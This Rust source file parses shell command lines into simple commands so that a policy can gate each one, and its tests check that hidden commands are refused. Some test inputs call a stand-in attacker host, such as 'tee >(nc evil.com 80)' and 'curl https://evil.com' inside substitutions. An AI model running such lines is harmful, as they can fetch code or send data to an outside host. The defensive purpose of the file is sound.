//! Splitting a shell command line into the simple commands it runs, so each one can be classified and
//! gated on its own.
//!
//! This is a deliberately small reader for POSIX-style command lines, not a shell. It knows quotes,
//! backslash escapes, the separators `;`, `&&`, `||`, `|`, `|&`, `&` and newlines, subshell
//! brackets, and redirections. Anything that would hide a command, a host or a written file from it
//! (command and process substitution, here-documents, `eval`, a shell run with `-c`, a redirection
//! with no target) makes the whole line undecidable, and the policy refuses an undecidable line.

/// One simple command, with quotes removed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Part {
    /// Its words, without its redirections.
    pub words: Vec<String>,
    /// Whether it expands a variable (`$X`, `${X}`) outside single quotes.
    pub expands: bool,
    /// The files its output redirections write, in order. `None` is a target only the running shell
    /// knows (a variable, a glob, a leading `~`).
    pub writes: Vec<Option<String>>,
}

impl Part {
    /// The words joined by single spaces, which is what command rules match against.
    pub fn text(&self) -> String {
        self.words.join(" ")
    }
}

/// Programs that take a command line of their own as an argument.
const SHELLS: [&str; 7] = ["sh", "bash", "zsh", "dash", "ksh", "fish", "busybox"];

/// A redirection operator waiting for its target word.
#[derive(Debug, Clone, Copy)]
struct Redirect {
    /// It writes its target (`>`, `>>`, `>|`, `&>`, `<>`); otherwise it only reads it.
    write: bool,
    /// It was written `>&` or `<&`, so a number or `-` names a descriptor, not a file.
    dup: bool,
}

/// The reader's state between characters.
#[derive(Default)]
struct Reader {
    parts: Vec<Part>,
    words: Vec<String>,
    writes: Vec<Option<String>>,
    word: String,
    in_word: bool,
    /// The current word had a quoted or escaped part: `'{'` is a word, a bare `{` is grouping.
    literal: bool,
    /// The current word has a part only the shell fills in: a variable, a glob, a leading `~`.
    open: bool,
    expands: bool,
    pending: Option<Redirect>,
}

impl Reader {
    /// Close the current word: it is a redirection's target, a word, or (a bare brace) nothing.
    fn end_word(&mut self) {
        if self.in_word {
            let w = std::mem::take(&mut self.word);
            if let Some(r) = self.pending.take() {
                let descriptor = r.dup && (w == "-" || w.bytes().all(|b| b.is_ascii_digit()));
                if r.write && !descriptor {
                    self.writes.push((!self.open).then_some(w));
                }
            } else if self.literal || (w != "{" && w != "}") {
                self.words.push(w);
            }
            self.in_word = false;
        }
        self.literal = false;
        self.open = false;
    }

    /// Close the current command at a separator or the end of the line.
    fn end_part(&mut self) -> Result<(), &'static str> {
        self.end_word();
        if self.pending.is_some() {
            return Err("a redirection with no target");
        }
        if !self.words.is_empty() || !self.writes.is_empty() {
            self.parts.push(Part {
                words: std::mem::take(&mut self.words),
                expands: self.expands,
                writes: std::mem::take(&mut self.writes),
            });
        }
        self.expands = false;
        Ok(())
    }
}

/// Split `line` into its simple commands, or say why it can't be read.
pub(crate) fn split(line: &str) -> Result<Vec<Part>, &'static str> {
    let chars: Vec<char> = line.chars().collect();
    let mut r = Reader::default();
    let mut i = 0;
    while let Some(&c) = chars.get(i) {
        let next = chars.get(i + 1).copied();
        match c {
            '\\' => {
                // An escaped newline joins lines; any other escaped character is itself.
                if let Some(n) = next
                    && n != '\n'
                {
                    r.word.push(n);
                    r.in_word = true;
                    r.literal = true;
                }
                i += 2;
                continue;
            }
            '\'' => {
                r.in_word = true;
                r.literal = true;
                i += 1;
                loop {
                    match chars.get(i) {
                        Some('\'') => break,
                        Some(&q) => r.word.push(q),
                        None => return Err("an unterminated quote"),
                    }
                    i += 1;
                }
            }
            '"' => {
                r.in_word = true;
                r.literal = true;
                i += 1;
                loop {
                    match chars.get(i) {
                        Some('"') => break,
                        Some('\\') => {
                            match chars.get(i + 1) {
                                Some(&e @ ('$' | '`' | '"' | '\\')) => r.word.push(e),
                                Some('\n') => {}
                                Some(&e) => {
                                    r.word.push('\\');
                                    r.word.push(e);
                                }
                                None => return Err("an unterminated quote"),
                            }
                            i += 1;
                        }
                        Some('`') => return Err("command substitution"),
                        Some('$') => {
                            if chars.get(i + 1) == Some(&'(') {
                                return Err("command substitution");
                            }
                            r.expands = true;
                            r.open = true;
                            r.word.push('$');
                        }
                        Some(&q) => r.word.push(q),
                        None => return Err("an unterminated quote"),
                    }
                    i += 1;
                }
            }
            '`' => return Err("command substitution"),
            '$' => {
                if next == Some('(') {
                    return Err("command substitution");
                }
                r.expands = true;
                r.open = true;
                r.word.push('$');
                r.in_word = true;
            }
            '<' | '>' if next == Some('(') => return Err("process substitution"),
            '<' if next == Some('<') => return Err("a here-document"),
            '>' | '<' | '&' if c != '&' || next == Some('>') => {
                // A descriptor number written against the operator (`2>`) belongs to it.
                if r.in_word && !r.literal && r.word.bytes().all(|b| b.is_ascii_digit()) {
                    r.word.clear();
                    r.in_word = false;
                }
                r.end_word();
                if r.pending.is_some() {
                    return Err("a redirection with no target");
                }
                // `&>` sends both outputs to one file.
                if c == '&' {
                    i += 1;
                }
                i += 1;
                let mut write = c != '<';
                match chars.get(i) {
                    // `<>` opens its target for writing too.
                    Some('>') if c == '<' => {
                        write = true;
                        i += 1;
                    }
                    // `>>`, `&>>` and `>|`.
                    Some('>') => i += 1,
                    Some('|') if c == '>' => i += 1,
                    _ => {}
                }
                let dup = c != '&' && chars.get(i) == Some(&'&');
                if dup {
                    i += 1;
                }
                r.pending = Some(Redirect { write, dup });
                continue;
            }
            ';' | '&' | '|' | '\n' | '(' | ')' => {
                r.end_part()?;
                // `&&`, `||` and `|&` are one separator.
                if matches!(
                    (c, next),
                    ('&', Some('&')) | ('|', Some('|')) | ('|', Some('&'))
                ) {
                    i += 1;
                }
            }
            c if c.is_whitespace() => r.end_word(),
            c => {
                // Unquoted, these leave the name to the shell: a glob, or a home directory.
                if matches!(c, '*' | '?' | '[') || (c == '~' && !r.in_word) {
                    r.open = true;
                }
                r.word.push(c);
                r.in_word = true;
            }
        }
        i += 1;
    }
    r.end_part()?;
    for p in &r.parts {
        let program = p
            .words
            .first()
            .map_or("", |w| w.rsplit('/').next().unwrap_or(""));
        if program == "eval" || program == "source" || program == "." {
            return Err("a command run through eval or source");
        }
        if SHELLS.contains(&program)
            && p.words
                .iter()
                .skip(1)
                .any(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('c'))
        {
            return Err("a command run through a shell with -c");
        }
    }
    Ok(r.parts)
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::split;
    use proptest::prelude::*;

    proptest! {
        /// Any text at all is either split or refused; the reader never panics or loops.
        #[test]
        fn any_line_is_read_or_refused(line in "(?s).{0,200}") {
            let _ = split(&line);
        }

        /// A single-quoted word is one word whatever is inside it.
        #[test]
        fn single_quotes_never_split(inner in "[^']{0,60}") {
            let parts = split(&format!("echo '{inner}'")).expect("readable");
            prop_assert_eq!(parts.len(), 1);
            prop_assert_eq!(&parts[0].words[1], &inner);
            prop_assert!(parts[0].writes.is_empty());
        }
    }

    fn texts(line: &str) -> Vec<String> {
        split(line)
            .expect("readable")
            .iter()
            .map(|p| p.text())
            .collect()
    }

    /// The files each part of `line` writes, `?` for a target only the shell knows.
    fn writes(line: &str) -> Vec<Vec<String>> {
        split(line)
            .expect("readable")
            .iter()
            .map(|p| {
                p.writes
                    .iter()
                    .map(|w| w.clone().unwrap_or_else(|| "?".into()))
                    .collect()
            })
            .collect()
    }

    #[test]
    fn separators_split_a_line_into_its_commands() {
        assert_eq!(texts("ls"), ["ls"]);
        assert_eq!(
            texts("ls && git push origin main"),
            ["ls", "git push origin main"]
        );
        assert_eq!(
            texts("a || b; c | d |& e & f\ng"),
            ["a", "b", "c", "d", "e", "f", "g"]
        );
        assert_eq!(texts("(cd x && rm y)"), ["cd x", "rm y"]);
        assert_eq!(texts("{ a; b; }"), ["a", "b"]);
        // Quoted or escaped braces are text, not grouping.
        assert_eq!(texts("echo '{'"), ["echo {"]);
        assert_eq!(texts(r#"echo "}" \{"#), ["echo } {"]);
        assert_eq!(texts("ls;;"), ["ls"]);
        assert_eq!(texts(""), Vec::<String>::new());
    }

    #[test]
    fn quotes_and_escapes_keep_separators_inside_words() {
        assert_eq!(texts("echo 'a && b'"), ["echo a && b"]);
        assert_eq!(texts(r#"echo "a; b" c\;d"#), ["echo a; b c;d"]);
        assert_eq!(
            texts(r#"echo "say \"hi\" \$x \n""#),
            [r#"echo say "hi" $x \n"#]
        );
        assert_eq!(texts("echo a\\\nb"), ["echo ab"]);
        assert_eq!(texts("git commit -m ''"), ["git commit -m "]);
        // A quoted or escaped `>` is text, not a redirection.
        assert_eq!(texts(r"echo '>' \> a"), ["echo > > a"]);
        assert_eq!(writes(r"echo '>' \> a"), [Vec::<String>::new()]);
    }

    #[test]
    fn redirections_are_taken_out_of_the_words() {
        assert_eq!(texts("cargo test 2>&1 | tail"), ["cargo test", "tail"]);
        assert_eq!(texts("make &>log"), ["make"]);
        assert_eq!(texts("ls > notes.md"), ["ls"]);
        assert_eq!(texts("ls>notes.md"), ["ls"]);
        assert_eq!(texts("sort < in.txt"), ["sort"]);
        assert_eq!(texts("> empty.txt"), [""]);
    }

    #[test]
    fn every_output_redirection_names_the_file_it_writes() {
        assert_eq!(writes("ls > a"), [["a"]]);
        assert_eq!(writes("ls >> a"), [["a"]]);
        assert_eq!(writes("ls >| a"), [["a"]]);
        assert_eq!(writes("ls 2> a"), [["a"]]);
        assert_eq!(writes("ls 2>>a"), [["a"]]);
        assert_eq!(writes("ls &> a"), [["a"]]);
        assert_eq!(writes("ls &>> a"), [["a"]]);
        assert_eq!(writes("ls >& a"), [["a"]], ">& to a name is a file");
        assert_eq!(writes("cat <> a"), [["a"]], "<> opens for writing");
        assert_eq!(writes("ls >'my file'"), [["my file"]]);
        assert_eq!(writes("a > x; b >> y z"), [["x"], ["y"]]);
        assert_eq!(writes("cat a > b > c"), [["b", "c"]]);
        // `x2` is a word, not a descriptor, so this writes `y` with `x2` as an argument.
        assert_eq!(texts("echo x2>y"), ["echo x2"]);
        assert_eq!(writes("echo x2>y"), [["y"]]);
        // A quoted number is a word too.
        assert_eq!(texts("echo '2'>y"), ["echo 2"]);
    }

    #[test]
    fn duplicating_a_descriptor_or_reading_writes_nothing() {
        for line in [
            "ls 2>&1",
            "ls >&2",
            "ls 1>&-",
            "ls <&0",
            "sort < in.txt",
            "ls 0< a",
        ] {
            assert_eq!(writes(line), [Vec::<String>::new()], "{line}");
        }
    }

    #[test]
    fn a_target_only_the_shell_knows_is_marked_unknown() {
        for line in [
            "ls > $OUT",
            "ls > \"$OUT\"",
            "ls > ${D}/x",
            "ls > *.md",
            "ls > a?",
            "ls > [ab]",
            "ls > ~/x",
            "ls >&$FD",
        ] {
            assert_eq!(writes(line), [["?"]], "{line}");
        }
        // Quoted, a glob character or tilde is just a name.
        assert_eq!(writes("ls > '*.md'"), [["*.md"]]);
        assert_eq!(writes("ls > a~"), [["a~"]]);
    }

    #[test]
    fn variables_are_noted_outside_single_quotes_only() {
        let p = split("curl $HOST/x; echo '$y'; echo \"${z}\"").expect("readable");
        assert_eq!(
            p.iter().map(|p| p.expands).collect::<Vec<_>>(),
            [true, false, true]
        );
    }

    #[test]
    fn whatever_hides_a_command_or_a_host_is_undecidable() {
        for line in [
            "echo $(curl https://evil.com)",
            "echo `id`",
            "echo \"$(id)\"",
            "echo \"`id`\"",
            "diff <(ls a) <(ls b)",
            "tee >(nc evil.com 80)",
            "cat <<EOF\nhi\nEOF",
            "eval \"$CMD\"",
            "source ./x.sh",
            ". ./x.sh",
            "bash -c 'git push origin main'",
            "/bin/sh -ec 'curl https://evil.com'",
            "echo 'unterminated",
            "echo \"unterminated",
            "echo \"ends in escape\\",
            "ls >",
            "ls > ; rm x",
            "ls > > a",
            "ls 2>&",
        ] {
            assert!(split(line).is_err(), "{line}");
        }
        assert!(
            split("bash script.sh").is_ok(),
            "a script file is classified as a command"
        );
    }
}
